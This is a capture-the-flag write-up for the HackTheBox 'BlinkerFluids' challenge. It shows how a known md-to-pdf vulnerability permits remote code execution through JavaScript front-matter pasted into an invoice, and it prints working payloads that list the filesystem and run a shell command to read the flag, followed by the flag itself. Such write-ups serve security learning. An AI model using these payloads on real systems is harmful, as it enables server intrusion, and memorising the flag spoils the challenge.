# BlinkerFluids
> Write-up author: jon-brandy
## DESCRIPTION:
Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. 
The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. 
Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him?
## HINT:
- NONE
## STEPS:
1. First, open the host given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214273575-71a1a116-e77c-4b78-b1f9-182231b3119a.png)


2. Let's try to see the pdf file.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214273949-7f7e5773-32b8-4b91-a2b9-9cf8fdb88ab2.png)


3. Nothing that could be our interest here, so let's check the source code.

> RESULT - challenge - helpers

![image](https://user-images.githubusercontent.com/70703371/214274687-b6edf665-e6ef-4c59-8a60-461de194d9dc.png)


4. Next i did a small outsource about MD to PDF vulnerability and found out there's a CVE about it.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214274957-8a8bed1b-1ef0-42d6-a59a-ae1a6d47d349.png)


5. Seems we can do RCE.
6. Checking the github issue and found another payload we can use.

![image](https://user-images.githubusercontent.com/70703371/214275839-a29d8ac3-3e27-45bf-b988-b58eb030e726.png)


7. Little bit confused for the first payload we got, but let's use the other one with more thumbs up :D.

![image](https://user-images.githubusercontent.com/70703371/214276416-57940a2d-9265-4b93-a0fa-0b838b63c4a5.png)


```js
---js
{
    css: `body::before { content: "${require('fs').readdirSync('/').join()}"; display: block }`,
}
---
```


8. Copy the payload -> create new invoice -> paste the script -> save. Open the pdf file.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214276705-3860a1d1-dd40-4fbf-bfc4-6613fbcd6d5c.png)


9. Great we listed all the files and directories, notice there's a `flag.txt` file. Now to cat the flag we can utilize the payload we got at first. Grab this one and modify the payload

![image](https://user-images.githubusercontent.com/70703371/214277375-b811ab01-d3e7-4cc4-a628-27ce858e1c0f.png)


> FROM

```js
---js
{
    css: `body::before { content: "${}"; display: block }`,
}
---
```

> TO

```js
---js
{
    css: `body::before { content: "${require('child_process').execSync('cat /flag.txt')}"; display: block }`,
}
---
```

10. Now create new invoice again -> paste the payload -> save it -> open the pdf.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214279170-37362676-1095-441b-bb16-8184de5056d6.png)


11. Got the flag!

## FLAG

```
HTB{int3rG4l4c7iC_r1d3_0n_bl1nk3r_flu1d5}
```

